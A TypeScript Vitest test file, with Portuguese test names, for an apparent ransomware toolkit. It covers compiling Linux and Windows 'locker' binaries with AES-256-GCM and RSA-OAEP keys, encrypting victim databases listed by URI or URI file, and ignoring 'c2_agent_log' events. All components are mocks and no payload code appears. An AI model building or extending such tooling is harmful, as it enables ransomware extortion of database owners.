import { describe, it, expect, beforeEach } from "vitest";
import { CompileRansomUseCase } from "../../../src/application/ransom/use-cases/CompileRansomUseCase.js";
import { RansomController } from "../../../src/infra/controllers/RansomController.js";
import { MockRansomCompiler } from "../../mocks/MockRansomCompiler.js";
import { MockPythonWsClient } from "../../mocks/MockPythonWsClient.js";
import { Result } from "../../../src/shared/Result.js";
import type { RansomSO } from "../../../src/domain/ports/IRansomCompiler.js";
import type { DbTarget } from "../../../src/application/ransom/IRansomController.js";

describe("CompileRansomUseCase", () => {
  let compiler: MockRansomCompiler;
  let useCase: CompileRansomUseCase;
  let logs: string[];

  beforeEach(() => {
    compiler = new MockRansomCompiler();
    useCase = new CompileRansomUseCase(compiler);
    logs = [];
  });

  const onLog = (msg: string) => logs.push(msg);

  it("deve rejeitar SO invalido com mensagem descritiva", async () => {
    const result = await useCase.execute("freebsd" as RansomSO, onLog);

    expect(result.isFailure).toBe(true);
    expect(result.error).toContain("freebsd");
    expect(result.error).toContain("linux");
    expect(result.error).toContain("windows");
  });

  it("deve rejeitar string vazia como SO", async () => {
    const result = await useCase.execute("" as RansomSO, onLog);

    expect(result.isFailure).toBe(true);
    expect(compiler.calls).toHaveLength(0);
  });

  it("nao deve chamar compiler quando SO invalido", async () => {
    await useCase.execute("macos" as RansomSO, onLog);

    expect(compiler.calls).toHaveLength(0);
  });

  it("deve retornar privKeyPem no resultado de sucesso", async () => {
    const result = await useCase.execute("linux", onLog);

    expect(result.isSuccess).toBe(true);
    expect(result.value!.privKeyPem).toContain("PRIVATE KEY");
    expect(result.value!.privKeyPem.length).toBeGreaterThan(10);
  });

  it("deve logar AES-256-GCM no inicio da compilacao", async () => {
    await useCase.execute("linux", onLog);

    expect(logs.some((l) => l.includes("AES-256-GCM"))).toBe(true);
  });

  it("nao deve gerar logs ao rejeitar SO invalido", async () => {
    await useCase.execute("android" as RansomSO, onLog);

    expect(logs).toHaveLength(0);
  });

  it("deve logar erro exato do compilador na falha", async () => {
    compiler.result = Result.fail("imagem Docker corrompida (exit code 137)");

    await useCase.execute("linux", onLog);

    expect(logs.some((l) => l.includes("exit code 137"))).toBe(true);
  });

  it("deve preservar buildId do resultado do compilador", async () => {
    compiler.result = Result.ok({
      binaryPath: "/builds/custom/locker",
      buildId: "build-uuid-abc-123",
      privKeyPem: "-----BEGIN PRIVATE KEY-----\nDATA\n-----END PRIVATE KEY-----\n",
    });

    const result = await useCase.execute("windows", onLog);

    expect(result.value!.buildId).toBe("build-uuid-abc-123");
  });

  it("deve chamar compiler exatamente uma vez por execucao", async () => {
    await useCase.execute("linux", onLog);
    await useCase.execute("windows", onLog);

    expect(compiler.calls).toEqual(["linux", "windows"]);
  });

  it("deve incluir RSA-OAEP no log de compilacao", async () => {
    await useCase.execute("windows", onLog);

    expect(logs.some((l) => l.includes("RSA-OAEP"))).toBe(true);
  });
});

describe("RansomController.compile", () => {
  let compiler: MockRansomCompiler;
  let wsClient: MockPythonWsClient;
  let controller: RansomController;
  let logs: string[];

  beforeEach(() => {
    compiler = new MockRansomCompiler();
    wsClient = new MockPythonWsClient();
    controller = new RansomController(new CompileRansomUseCase(compiler), wsClient);
    logs = [];
  });

  const onLog = (msg: string) => logs.push(msg);

  it("deve retornar mesmo Result que o use case retorna", async () => {
    const result = await controller.compile("linux", onLog);

    expect(result.isSuccess).toBe(true);
    expect(result.value!.buildId).toBe("456");
  });

  it("deve propagar rejeicao de SO invalido do use case", async () => {
    const result = await controller.compile("solaris" as RansomSO, onLog);

    expect(result.isFailure).toBe(true);
    expect(result.error).toContain("solaris");
  });

  it("nao deve interagir com wsClient ao compilar", async () => {
    await controller.compile("linux", onLog);

    expect(wsClient.sendCalls).toHaveLength(0);
  });

  it("deve passar onLog para o use case corretamente", async () => {
    await controller.compile("linux", onLog);

    expect(logs.length).toBeGreaterThan(0);
    expect(logs.some((l) => l.includes("RSA-2048"))).toBe(true);
  });

  it("deve manter estado do compiler apos multiplas chamadas", async () => {
    await controller.compile("linux", onLog);
    await controller.compile("windows", onLog);

    expect(compiler.calls).toEqual(["linux", "windows"]);
  });
});

describe("RansomController.encryptDb", () => {
  let compiler: MockRansomCompiler;
  let wsClient: MockPythonWsClient;
  let controller: RansomController;
  let logs: string[];

  beforeEach(() => {
    compiler = new MockRansomCompiler();
    wsClient = new MockPythonWsClient();
    controller = new RansomController(new CompileRansomUseCase(compiler), wsClient);
    logs = [];
  });

  const onLog = (msg: string) => logs.push(msg);

  it("deve enviar URI no payload em modo single", async () => {
    wsClient.sendResult = { success: true, data: { encrypted: 5, db: "Supabase" } };

    await controller.encryptDb("Supabase", "single", "https://x.supabase.co|key", onLog);

    expect(wsClient.sendCalls[0].payload.uri).toBe("https://x.supabase.co|key");
    expect(wsClient.sendCalls[0].payload.file_path).toBeUndefined();
  });

  it("deve enviar file_path no payload em modo file", async () => {
    wsClient.sendResult = { success: true, data: { encrypted: 50, db: "Redis" } };

    await controller.encryptDb("Redis", "file", "/data/redis_uris.txt", onLog);

    expect(wsClient.sendCalls[0].payload.file_path).toBe("/data/redis_uris.txt");
    expect(wsClient.sendCalls[0].payload.uri).toBeUndefined();
  });

  it("deve retornar db correto no DTO de sucesso", async () => {
    wsClient.sendResult = { success: true, data: { encrypted: 7, db: "PostgreSQL" } };

    const result = await controller.encryptDb("PostgreSQL", "single", "postgresql://host/db", onLog);

    expect(result.value!.db).toBe("PostgreSQL");
  });

  it("deve retornar contagem encrypted no DTO", async () => {
    wsClient.sendResult = { success: true, data: { encrypted: 1337, db: "MySQL" } };

    const result = await controller.encryptDb("MySQL", "single", "mysql://host/db", onLog);

    expect(result.value!.encrypted).toBe(1337);
  });

  it("deve logar URI com label correto em modo single", async () => {
    wsClient.sendResult = { success: true, data: { encrypted: 0, db: "MongoDB" } };

    await controller.encryptDb("MongoDB", "single", "mongodb://host/db", onLog);

    expect(logs.some((l) => l.includes("URI:"))).toBe(true);
  });

  it("deve logar Arquivo com label correto em modo file", async () => {
    wsClient.sendResult = { success: true, data: { encrypted: 0, db: "MongoDB" } };

    await controller.encryptDb("MongoDB", "file", "/tmp/uris.txt", onLog);

    expect(logs.some((l) => l.includes("Arquivo:"))).toBe(true);
  });

  it("deve tratar excecao nao-Error como string", async () => {
    wsClient.send = async () => { throw "raw string error"; };

    const result = await controller.encryptDb("MongoDB", "single", "uri", onLog);

    expect(result.isFailure).toBe(true);
    expect(result.error).toContain("raw string error");
  });

  it("deve ignorar push events de outros tipos", async () => {
    const originalSend = wsClient.send.bind(wsClient);
    wsClient.send = async (action, payload = {}) => {
      wsClient.simulateEvent({
        success: true,
        event: "c2_agent_log",
        data: { msg: "should be ignored" },
      });
      wsClient.sendCalls.push({ action, payload });
      return { success: true, data: { encrypted: 0, db: "MongoDB" } };
    };

    await controller.encryptDb("MongoDB", "single", "uri", onLog);

    expect(logs.every((l) => !l.includes("should be ignored"))).toBe(true);
  });

  it("deve ignorar push events sem msg no data", async () => {
    const originalSend = wsClient.send.bind(wsClient);
    wsClient.send = async (action, payload = {}) => {
      wsClient.simulateEvent({
        success: true,
        event: "ransom_db_log",
        data: { something: "else" },
      });
      wsClient.sendCalls.push({ action, payload });
      return { success: true, data: { encrypted: 0, db: "MongoDB" } };
    };

    const logCount = logs.length;
    await controller.encryptDb("MongoDB", "single", "uri", onLog);

    expect(logs.filter((l) => l.includes("else"))).toHaveLength(0);
  });

  it("deve fazer unsubscribe mesmo quando WS lanca excecao", async () => {
    wsClient.shouldThrow = true;

    await controller.encryptDb("MongoDB", "single", "uri", onLog);

    const logsBefore = logs.length;
    wsClient.simulateEvent({
      success: true,
      event: "ransom_db_log",
      data: { msg: "late event" },
    });
    expect(logs.length).toBe(logsBefore);
  });
});

describe("RansomController.generateExample", () => {
  let wsClient: MockPythonWsClient;
  let controller: RansomController;

  beforeEach(() => {
    wsClient = new MockPythonWsClient();
    controller = new RansomController(
      new CompileRansomUseCase(new MockRansomCompiler()),
      wsClient,
    );
  });

  it("deve retornar filePath e db no DTO de sucesso", async () => {
    wsClient.sendResult = { success: true, data: {} };

    const result = await controller.generateExample("Redis", "/tmp/redis_example.txt");

    expect(result.value!.filePath).toBe("/tmp/redis_example.txt");
    expect(result.value!.db).toBe("Redis");
  });

  it("deve enviar output_path correto no payload", async () => {
    wsClient.sendResult = { success: true, data: {} };

    await controller.generateExample("Supabase", "/home/user/supa.txt");

    expect(wsClient.sendCalls[0].payload.output_path).toBe("/home/user/supa.txt");
  });

  it("deve retornar erro generico quando Python nao envia error string", async () => {
    wsClient.sendResult = { success: false };

    const result = await controller.generateExample("MongoDB", "/tmp/x.txt");

    expect(result.isFailure).toBe(true);
    expect(result.error).toContain("Erro desconhecido");
  });

  it("deve funcionar para cada DbTarget suportado", async () => {
    const targets: DbTarget[] = ["Supabase", "MongoDB", "MySQL", "PostgreSQL", "Redis"];
    wsClient.sendResult = { success: true, data: {} };

    for (const db of targets) {
      const result = await controller.generateExample(db, `/tmp/${db}.txt`);
      expect(result.isSuccess).toBe(true);
      expect(result.value!.db).toBe(db);
    }
  });

  it("deve tratar excecao nao-Error no generateExample", async () => {
    wsClient.send = async () => { throw 42; };

    const result = await controller.generateExample("MySQL", "/tmp/x.txt");

    expect(result.isFailure).toBe(true);
    expect(result.error).toContain("42");
  });
});

describe("Input validation", () => {
  let compiler: MockRansomCompiler;
  let useCase: CompileRansomUseCase;

  beforeEach(() => {
    compiler = new MockRansomCompiler();
    useCase = new CompileRansomUseCase(compiler);
  });

  it("deve aceitar exatamente 'linux' como SO valido", async () => {
    const result = await useCase.execute("linux");
    expect(result.isSuccess).toBe(true);
  });

  it("deve aceitar exatamente 'windows' como SO valido", async () => {
    const result = await useCase.execute("windows");
    expect(result.isSuccess).toBe(true);
  });

  it("deve rejeitar 'Linux' com L maiusculo", async () => {
    const result = await useCase.execute("Linux" as RansomSO);
    expect(result.isFailure).toBe(true);
  });

  it("deve rejeitar 'WINDOWS' em maiusculas", async () => {
    const result = await useCase.execute("WINDOWS" as RansomSO);
    expect(result.isFailure).toBe(true);
  });

  it("deve rejeitar undefined como SO", async () => {
    const result = await useCase.execute(undefined as unknown as RansomSO);
    expect(result.isFailure).toBe(true);
  });
});
